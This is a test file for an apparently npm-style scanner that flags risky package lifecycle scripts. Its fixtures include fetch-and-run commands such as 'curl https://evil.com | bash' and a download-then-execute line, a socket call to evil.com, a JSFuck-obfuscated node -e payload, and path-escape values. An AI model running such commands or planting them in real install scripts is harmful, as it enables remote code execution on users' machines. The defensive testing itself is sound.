  const jsfuckPayload = '[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]'
  const cmd = `node -e '${jsfuckPayload}'`
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { postinstall: cmd })
    const inlineEntry = result.find((f) => f.path === null)
    t.ok(inlineEntry, 'inline command entry emitted')
    t.ok(inlineEntry.signals.includes('jsfuck-obfuscation'),
      'jsfuck-obfuscation signal detected in inline node -e command')
    t.match(inlineEntry.reason, /inline lifecycle script/, 'reason labels the event')
  })
})

t.test('scanPackageScripts: node -e extracts and scans local require refs', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'helper.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { postinstall: `node -e "require('./helper.js')"` })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('helper.js'), 'node -e: local require ref is extracted and scanned')
    const entry = result.find((f) => f.path === 'helper.js')
    t.ok(entry.signals.includes('uses-child-process'), 'signals from the referenced file are detected')
  })
})

t.test('scanPackageScripts: node --eval extracts and scans local require refs', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { postinstall: `node --eval "require('./setup.js')"` })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('setup.js'), 'node --eval: local require ref is extracted and scanned')
  })
})

t.test('scanPackageScripts: clean inline command produces no inline entry', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
  }, async (dir) => {
    const result = await scan(dir, { install: 'node build.js' })
    // build.js has no signals, and the command string itself is clean
    t.notOk(result.some((f) => f.path === null), 'no inline entry for a clean command')
  })
})

// --- New signal detection tests ------------------------------------------

t.test('detectSignals: uses-worker-threads (CJS require)', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('worker_threads')").includes('uses-worker-threads'),
    "bare require('worker_threads')")
  t.ok(detectSignals("require('node:worker_threads')").includes('uses-worker-threads'),
    'node: prefix require')
  t.notOk(detectSignals('// no workers here').includes('uses-worker-threads'))
  t.end()
})

t.test('detectSignals: uses-worker-threads (ESM import)', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("import { Worker } from 'worker_threads'").includes('uses-worker-threads'),
    'named ESM import')
  t.ok(detectSignals("import wt from 'node:worker_threads'").includes('uses-worker-threads'),
    'node: prefix ESM import')
  t.end()
})

t.test('detectSignals: uses-net-socket (net module)', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('net')").includes('uses-net-socket'), "require('net')")
  t.ok(detectSignals("require('node:net')").includes('uses-net-socket'), 'node: prefix')
  t.ok(detectSignals("import net from 'net'").includes('uses-net-socket'), 'ESM import')
  t.notOk(detectSignals('// no sockets').includes('uses-net-socket'))
  t.end()
})

t.test('detectSignals: uses-net-socket (tls module)', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('tls')").includes('uses-net-socket'), "require('tls')")
  t.ok(detectSignals("require('node:tls')").includes('uses-net-socket'), 'node: prefix tls')
  t.ok(detectSignals("import tls from 'node:tls'").includes('uses-net-socket'), 'ESM tls import')
  t.end()
})

t.test('detectSignals: uses-dns', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals("require('dns')").includes('uses-dns'), "require('dns')")
  t.ok(detectSignals("require('node:dns')").includes('uses-dns'), 'node: prefix')
  t.ok(detectSignals("require('dns/promises')").includes('uses-dns'), 'dns/promises')
  t.ok(detectSignals("require('node:dns/promises')").includes('uses-dns'), 'node:dns/promises')
  t.ok(detectSignals("import dns from 'node:dns'").includes('uses-dns'), 'ESM import')
  t.notOk(detectSignals('// no dns').includes('uses-dns'))
  t.end()
})

t.test('detectSignals: shell-network-fetch (curl)', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('curl https://example.com/payload').includes('shell-network-fetch'),
    'curl with url')
  t.ok(detectSignals('curl -L https://example.com | bash').includes('shell-network-fetch'),
    'curl with flags')
  t.notOk(detectSignals('// no network fetching here').includes('shell-network-fetch'),
    'unrelated content is not flagged')
  t.end()
})

t.test('detectSignals: shell-network-fetch (wget)', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('wget https://example.com/file').includes('shell-network-fetch'),
    'wget with url')
  t.notOk(detectSignals('echo wget').includes('shell-network-fetch'),
    'wget as text argument is not flagged')
  t.end()
})

t.test('detectSignals: process-binding', (t) => {
  const { detectSignals } = scanner(t)
  t.ok(detectSignals('process.binding("fs")').includes('process-binding'), 'process.binding')
  t.ok(detectSignals('process.dlopen(mod, file)').includes('process-binding'), 'process.dlopen')
  t.notOk(detectSignals('// no bindings').includes('process-binding'))
  t.end()
})

// --- Shell source reference tests ----------------------------------------

t.test('findLocalRefs: detects shell source directives', (t) => {
  const { findLocalRefs } = scanner(t)
  t.ok(findLocalRefs('source ./lib/setup.sh').includes('./lib/setup.sh'),
    'source ./file.sh at start of content')
  t.ok(findLocalRefs('. ./lib/setup.sh').includes('./lib/setup.sh'),
    '. ./file.sh (POSIX dot) at start of content')
  t.ok(findLocalRefs('#!/bin/sh\n. ./helpers.sh\n').includes('./helpers.sh'),
    '. ./file.sh after newline')
  t.ok(findLocalRefs('setup; source ./config.sh').includes('./config.sh'),
    'source after semicolon')
  t.notOk(findLocalRefs('require("./local")').includes('./notshell'),
    'unrelated require is not confused with source')
  t.end()
})

t.test('scanPackageScripts: shell source chain is followed', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.sh': '#!/bin/sh\nsource ./lib/helpers.sh\n',
    'lib/helpers.sh': 'curl https://evil.com | bash',
  }, async (dir) => {
    const result = await scan(dir, { install: 'bash setup.sh' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('setup.sh'), 'entry shell script is scanned')
    t.ok(paths.includes('lib/helpers.sh'), 'sourced shell script is followed')
    const helpers = result.find((f) => f.path === 'lib/helpers.sh')
    t.ok(helpers.signals.includes('shell-network-fetch'), 'curl signal detected in sourced file')
  })
})

// --- node -p / --print flag tests ----------------------------------------

t.test('node -p does not misidentify expression as a file', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    // `node -p` evaluates and prints an expression; nothing on disk to scan.
    // The inline command scanner detects any signals from the command string itself.
    const result = await scan(dir, { install: "node -p 'process.env.HOME'" })
    // Should not produce a file-unreadable entry for the expression text.
    t.notOk(result.some((f) => f.path !== null && f.signals.includes('file-unreadable')),
      'no spurious file-unreadable entry for node -p expression')
  })
})

t.test('node --print does not misidentify expression as a file', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: "node --print 'process.env.HOME'" })
    t.notOk(result.some((f) => f.path !== null && f.signals.includes('file-unreadable')),
      'no spurious file-unreadable entry for node --print expression')
  })
})

// --- bash -c / sh -c inline command parsing tests -----------------------

t.test('bash -c follows file references in inline command', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: "bash -c 'node ./install.js'" })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'), 'bash -c: file inside inline command is scanned')
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry.signals.includes('uses-child-process'), 'signals detected in bash -c script')
  })
})

t.test('sh -c follows file references in inline command', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'build.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'sh -c "node ./build.js"' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('build.js'), 'sh -c: file inside inline command is scanned')
  })
})

t.test('bash -c with no argument returns no results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'bash -c' })
    t.strictSame(result, [], 'bash -c with no argument is safe')
  })
})

// --- ts-node / tsx TypeScript runner tests --------------------------------

t.test('ts-node script is scanned for signals', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.ts': "import { exec } from 'child_process'",
  }, async (dir) => {
    const result = await scan(dir, { install: 'ts-node ./install.ts' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.ts'), 'ts-node: script file is scanned')
    const entry = result.find((f) => f.path === 'install.ts')
    t.ok(entry.signals.includes('uses-child-process'), 'signals detected in ts-node script')
  })
})

t.test('tsx script is scanned for signals', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.ts': "import https from 'https'",
  }, async (dir) => {
    const result = await scan(dir, { install: 'tsx ./setup.ts' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('setup.ts'), 'tsx: script file is scanned')
  })
})

// --- cross-env wrapper tests ---------------------------------------------

t.test('cross-env wrapper: script file is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'cross-env NODE_ENV=production node ./install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'), 'cross-env: script file is scanned')
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry.signals.includes('uses-child-process'), 'signals detected in cross-env wrapped script')
  })
})

t.test('cross-env wrapper with multiple env vars: script is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'build.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'cross-env NODE_ENV=production DEBUG=1 node ./build.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('build.js'), 'cross-env with multiple vars: script is scanned')
  })
})

// --- Quoted filenames with spaces ----------------------------------------
// shellTokenize() must preserve spaces inside quotes and strip the quote
// chars so every code path receives the bare filename.

t.test('node: double-quoted filename with spaces is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node "my install.js"' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my install.js'), 'double-quoted spaced filename found')
    t.ok(result.find((f) => f.path === 'my install.js')
      .signals.includes('uses-child-process'), 'signals detected')
  })
})

t.test('node: single-quoted filename with spaces is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my install.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: "node 'my install.js'" })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my install.js'), 'single-quoted spaced filename found')
  })
})

t.test('node --require: quoted specifier with spaces is resolved', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my preload.js': "require('child_process')",
    'install.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require "./my preload.js" install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my preload.js'), '--require spaced filename found')
  })
})

t.test('node -r: quoted specifier with spaces is resolved', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my preload.js': "require('net')",
    'install.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: "node -r './my preload.js' install.js" })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my preload.js'), '-r spaced filename found')
  })
})

t.test('node --loader: quoted specifier with spaces is resolved', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my loader.mjs': "export async function resolve(s,c,n){return n(s,c)}",
    'install.js': 'module.exports = 1',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --loader "./my loader.mjs" install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my loader.mjs'), '--loader spaced filename found')
  })
})

t.test('node -e: local ref inside inline code with spaces in path is found', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my lib.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { postinstall: `node -e "require('./my lib.js')"` })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my lib.js'), 'node -e: spaced local ref resolved')
  })
})

t.test('bash -c: quoted inner command with spaced filename is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: `bash -c "node './my install.js'"` })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my install.js'), 'bash -c: spaced filename inside inner command found')
  })
})

t.test('env wrapper: spaced filename is preserved after env vars', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my install.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'env NODE_ENV=prod node "my install.js"' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my install.js'), 'env: spaced filename found after env vars')
  })
})

t.test('cross-env wrapper: spaced filename is preserved after env vars', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my install.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'cross-env NODE_ENV=prod node "my install.js"' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my install.js'), 'cross-env: spaced filename found')
  })
})

t.test('bare env assignment: spaced filename is preserved', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'my install.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'NODE_ENV=prod node "my install.js"' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('my install.js'), 'bare env: spaced filename found')
  })
})

// --- Integration: new signals in scanned files ----------------------------

t.test('scanPackageScripts: uses-worker-threads detected in referenced file', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const { Worker } = require('worker_threads')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry, 'install.js is scanned')
    t.ok(entry.signals.includes('uses-worker-threads'), 'uses-worker-threads signal detected')
  })
})

t.test('scanPackageScripts: uses-net-socket detected in referenced file', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const net = require('net')\nnet.connect(80, 'evil.com')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry.signals.includes('uses-net-socket'), 'uses-net-socket signal detected')
  })
})

t.test('scanPackageScripts: uses-dns detected in referenced file', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const dns = require('dns')\ndns.lookup('example.com', () => {})",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry.signals.includes('uses-dns'), 'uses-dns signal detected')
  })
})

t.test('scanPackageScripts: shell-network-fetch detected in shell script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'fetch.sh': 'curl -s https://example.com/payload > /tmp/p && bash /tmp/p',
  }, async (dir) => {
    const result = await scan(dir, { install: 'bash fetch.sh' })
    const entry = result.find((f) => f.path === 'fetch.sh')
    t.ok(entry, 'shell script is scanned')
    t.ok(entry.signals.includes('shell-network-fetch'), 'curl triggers shell-network-fetch')
    t.ok(entry.signals.includes('external-url'), 'external-url also detected')
  })
})

t.test('scanPackageScripts: process-binding detected in referenced file', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': 'const binding = process.binding("fs")',
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry.signals.includes('process-binding'), 'process-binding signal detected')
  })
})

// --- sizeBytes field tests -----------------------------------------------

t.test('sizeBytes is a positive number for scanned files', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry, 'entry exists')
    t.equal(typeof entry.sizeBytes, 'number', 'sizeBytes is a number')
    t.ok(entry.sizeBytes > 0, 'sizeBytes is positive')
  })
})

t.test('sizeBytes is null for unreadable files', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node missing.js' })
    t.equal(result[0].sizeBytes, null, 'sizeBytes is null for an unreadable file')
  })
})

t.test('sizeBytes is null for inline command entries', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { postinstall: "node -e \"eval('x')\"" })
    const inlineEntry = result.find((f) => f.path === null)
    t.ok(inlineEntry, 'inline entry exists')
    t.equal(inlineEntry.sizeBytes, null, 'sizeBytes is null for an inline entry')
  })
})

t.test('file that opens but read throws is marked file-unreadable with sizeBytes null', async (t) => {
  const fakeFh = {
    read: async () => { throw new Error('simulated disk read error') },
    close: async () => {},
  }
  const fakeStat = { isFile: () => true }
  const mockFs = {
    ...require('node:fs/promises'),
    lstat: async () => fakeStat,
    open: async () => fakeFh,
  }
  const scan = t.mock('../../../lib/utils/script-risk-scanner.js', {
    'node:fs/promises': mockFs,
  })
  const result = await scan('/fake/pkg', { install: 'node install.js' })
  const entry = result.find((f) => f.path === 'install.js')
  t.ok(entry, 'entry exists')
  t.ok(entry.signals.includes('file-unreadable'), 'file-unreadable signal set')
  t.equal(entry.sha256, null, 'sha256 is null')
  t.equal(entry.sizeBytes, null, 'sizeBytes is null when file read fails')
})

t.test('file that fails to open (open throws) is marked file-unreadable', async (t) => {
  // fh is never assigned when open() throws, exercising the if (fh) false
  // branch inside the catch block.
  const fakeStat = { isFile: () => true }
  const mockFs = {
    ...require('node:fs/promises'),
    lstat: async () => fakeStat,
    open: async () => { throw new Error('simulated open error') },
  }
  const scan = t.mock('../../../lib/utils/script-risk-scanner.js', {
    'node:fs/promises': mockFs,
  })
  const result = await scan('/fake/pkg', { install: 'node install.js' })
  const entry = result.find((f) => f.path === 'install.js')
  t.ok(entry, 'entry exists')
  t.ok(entry.signals.includes('file-unreadable'), 'file-unreadable signal set')
  t.equal(entry.sha256, null, 'sha256 is null when open fails')
  t.equal(entry.sizeBytes, null, 'sizeBytes is null when open fails')
})

// --- Coverage: parseCommandFile edge-cases -------------------------------

t.test('direct executable ./script.sh is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'setup.sh': 'curl https://evil.com/payload',
  }, async (dir) => {
    const result = await scan(dir, { install: './setup.sh' })
    t.ok(result.some((f) => f.path === 'setup.sh'), './setup.sh is scanned directly')
  })
})

t.test('direct executable with no recognised extension gets scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'bin/postinstall': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: './bin/postinstall' })
    t.ok(result.some((f) => f.path === 'bin/postinstall'), './bin/postinstall is scanned')
  })
})

t.test('env with a leading -i flag still finds the interpreter', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'env -i node ./install.js' })
    t.ok(result.some((f) => f.path === 'install.js'),
      'env -i: script is found after the flag')
  })
})

t.test('env with only flags and no interpreter yields no file results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'env -i' })
    t.notOk(result.some((f) => f.path !== null),
      'env with no interpreter has no file-based results')
  })
})

t.test('cross-env with only KEY=VALUE and no interpreter yields no file results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'cross-env NODE_ENV=prod' })
    t.notOk(result.some((f) => f.path !== null),
      'cross-env with no interpreter has no file-based results')
  })
})

t.test('unknown interpreter (make) yields no file results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'make build' })
    t.notOk(result.some((f) => f.path !== null),
      'make build: no file-based results for an unknown interpreter')
  })
})

t.test('node with only non-local --require and no main file yields no file results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node --require dotenv/config' })
    t.notOk(result.some((f) => f.path !== null),
      'node with non-local --require and no main file has no file-based results')
  })
})

// --- Coverage: remaining edge-cases --------------------------------------

t.test('trailing shell operator produces no spurious extra entry', async (t) => {
  // A trailing && leaves an empty segment that parseSingleCommand must handle.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js && ' })
    t.ok(result.some((f) => f.path === 'install.js'), 'first command still scanned')
  })
})

t.test('empty script value yields no results', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: '' })
    t.strictSame(result, [], 'empty command string produces no results')
  })
})

t.test('node script reference that escapes the package boundary is not followed', async (t) => {
  // makeEntry returns null for out-of-bounds paths in command.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node ../../evil.js' })
    t.notOk(result.some((f) => f.path !== null && f.path.includes('evil')),
      'out-of-bounds script path is not scanned')
  })
})

t.test('node with unrecognised flag skips flag and still finds main script', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --max-old-space-size=4096 install.js' })
    t.ok(result.some((f) => f.path === 'install.js'),
      'main script found after unrecognised flag')
  })
})

t.test('node with bare module name (no extension) attempts to scan it', async (t) => {
  // The extensionless probing logic in scanFile tries appending .js/.mjs/.cjs.
  // When install.js exists, the scan should succeed and surface signals.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('https')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install' })
    t.ok(result.some((f) => f.path === 'install.js'),
      'bare name resolved to install.js via extensionless probing')
    t.ok(result.some((f) => f.path === 'install.js' && f.signals.includes('network-access')),
      'signals from the probed file are detected')
  })
})

t.test('node with bare module name that does not exist is reported unreadable', async (t) => {
  // When no .js/.mjs/.cjs variant exists either, the file is reported as
  // file-unreadable under the bare name.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node install' })
    t.ok(result.some((f) => f.path === 'install' && f.signals.includes('file-unreadable')),
      'bare name attempted at exact path, reported unreadable when not found')
  })
})

t.test('node with special-char arg (shell variable) stops scanning args', async (t) => {
  // `node $BUILD_SCRIPT` — special chars, not a file; should produce no file results.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node $BUILD_SCRIPT' })
    t.notOk(result.some((f) => f.path !== null), 'no file scanned for shell variable arg')
  })
})

t.test('node with scoped-package arg stops scanning args', async (t) => {
  // `node @scope/pkg` — scoped package, not a local file.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node @scope/pkg' })
    t.notOk(result.some((f) => f.path !== null), 'no file scanned for scoped package arg')
  })
})

t.test('bash with only flags and no script yields no file results', async (t) => {
  // `bash -x` — debug flag, no script filename.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'bash -x' })
    t.notOk(result.some((f) => f.path !== null),
      'bash with only flags and no script has no file results')
  })
})

t.test('unresolvable local require is silently skipped in references', async (t) => {
  // Covers the `return null` at the end of resolveLocalRef.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "const x = require('./totally-nonexistent')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    const entry = result.find((f) => f.path === 'install.js')
    t.ok(entry, 'install.js is still scanned')
    t.notOk(entry.references.some((r) => r.includes('nonexistent')),
      'unresolvable ref is not added to references')
  })
})

// --- Additional coverage tests --------------------------------------------

t.test('node --require flag with no following argument (line 257 false branch)', async (t) => {
  // `node --require` at end of command: no specifier follows the flag.
  // The false branch of `if (i + 1 < parts.length)` is taken.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'node --require' })
    t.notOk(result.some((f) => f.path !== null),
      '--require with no following arg produces no file scan results')
  })
})

t.test('node --require with out-of-bounds specifier (line 261 null entry)', async (t) => {
  // `node --require ../../evil.js ./install.js` — local specifier but escapes package dir.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('fs')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require ../../evil.js ./install.js' })
    t.notOk(result.some((f) => f.path && f.path.includes('evil')),
      'out-of-bounds --require specifier is not scanned')
    t.ok(result.some((f) => f.path === 'install.js'),
      'main script after out-of-bounds --require is still scanned')
  })
})

t.test('node --require=non-local-module does not scan it (line 273 false)', async (t) => {
  // `--require=dotenv/config` — equals-form with non-local specifier.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('fs')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require=dotenv/config ./install.js' })
    t.notOk(result.some((f) => f.path && f.path.includes('dotenv')),
      'non-local --require= specifier is not scanned')
    t.ok(result.some((f) => f.path === 'install.js'),
      'main script is still scanned after non-local --require=')
  })
})

t.test('node --require=out-of-bounds does not scan it (line 275 null entry)', async (t) => {
  // `--require=../../evil.js` — equals-form local specifier that escapes bounds.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('fs')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node --require=../../evil.js ./install.js' })
    t.notOk(result.some((f) => f.path && f.path.includes('evil')),
      'out-of-bounds --require= specifier is not scanned')
    t.ok(result.some((f) => f.path === 'install.js'),
      'main script is still scanned after out-of-bounds --require=')
  })
})

t.test('bash -c with empty string returns no results (line 324 false branch)', async (t) => {
  // `bash -c ''` — stripped inline command is empty; returns [].
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: "bash -c ''" })
    t.equal(result.length, 0, 'empty bash -c produces no scan results')
  })
})

t.test('bash with out-of-bounds script returns no results (line 330 null entry)', async (t) => {
  // `bash ../../evil.sh` — script path escapes the package directory.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: 'bash ../../evil.sh' })
    t.equal(result.length, 0, 'out-of-bounds bash script produces no scan results')
  })
})

t.test('direct executable escaping package dir returns no results (line 340)', async (t) => {
  // `../evil.sh` — interpreter path escapes the package directory.
  const scan = scanner(t)
  await withPackage(t, {}, async (dir) => {
    const result = await scan(dir, { install: '../evil.sh' })
    t.equal(result.length, 0, 'out-of-bounds direct executable produces no scan results')
  })
})

t.test('resolveLocalRef: package.json without main falls through to index.js (line 175 false)', async (t) => {
  // package.json exists and is valid JSON but has no `main` field.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('./lib')",
    'lib/package.json': JSON.stringify({ name: 'lib' }),   // valid JSON, no main
    'lib/index.js': "module.exports = {}",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    t.ok(result.some((f) => f.path === 'lib/index.js'),
      'falls through to index.js when package.json has no main field')
  })
})

t.test('resolveLocalRef: package.json#main is a directory, falls through (line 181 false)', async (t) => {
  // package.json#main points to a path that exists as a directory, not a file.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('./lib')",
    'lib/package.json': JSON.stringify({ main: 'subdir' }),
    'lib/subdir/index.js': "module.exports = {}",   // subdir is a directory
    'lib/index.js': "module.exports = {}",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    // main points to 'lib/subdir' which is a directory (not a file) →
    // isFile() returns false → falls through to index.js
    t.ok(result.some((f) => f.path === 'lib/index.js'),
      'falls through to index.js when package.json#main is a directory')
  })
})

t.test('follows local require() chains up to max depth (line 514 false)', async (t) => {
  // A require chain 4 levels deep; the 4th level is NOT recursed into.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('./a')",
    'a.js': "require('./b')",
    'b.js': "require('./c')",
    'c.js': "require('./d')",
    'd.js': "require('fs')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' }, { maxDepth: 3 })
    // install.js (depth 0) → a.js (1) → b.js (2) → c.js (3=maxDepth) → d.js NOT scanned
    t.ok(result.some((f) => f.path === 'install.js'), 'depth 0 scanned')
    t.ok(result.some((f) => f.path === 'a.js'), 'depth 1 scanned')
    t.ok(result.some((f) => f.path === 'b.js'), 'depth 2 scanned')
    t.ok(result.some((f) => f.path === 'c.js'), 'depth 3 scanned')
    t.notOk(result.some((f) => f.path === 'd.js'), 'd.js beyond max depth is not scanned')
  })
})

t.test('circular require() does not cause infinite recursion', async (t) => {
  // a.js requires b.js and b.js requires a.js.  The scanner must not loop
  // indefinitely; the second time a.js is encountered it is already in the
  // scanned map so the cached entry is reused and recursion stops.
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('./a.js')",
    'a.js': "require('./b.js')",
    'b.js': "require('./a.js')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'node install.js' })
    // install.js, a.js, and b.js should each appear at least once.
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'), 'install.js scanned')
    t.ok(paths.includes('a.js'), 'a.js scanned')
    t.ok(paths.includes('b.js'), 'b.js scanned')
    // The scan must terminate — an unbounded loop would time out or OOM.
    t.ok(result.length <= 6, 'result count is bounded (no infinite loop)')
  })
})

// --- bare inline env-variable assignment tests ---------------------------

t.test('bare inline env assignment before node: script is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'install.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'NODE_ENV=production node install.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('install.js'),
      'bare KEY=VALUE before node: script is scanned')
  })
})

t.test('multiple bare inline env assignments before node: script is scanned', async (t) => {
  const scan = scanner(t)
  await withPackage(t, {
    'build.js': "require('child_process')",
  }, async (dir) => {
    const result = await scan(dir, { install: 'DEBUG=1 NODE_OPTIONS=--inspect node ./build.js' })
    const paths = result.map((f) => f.path)
    t.ok(paths.includes('build.js'),
      'multiple bare KEY=VALUE before node: script is scanned')
  })
})

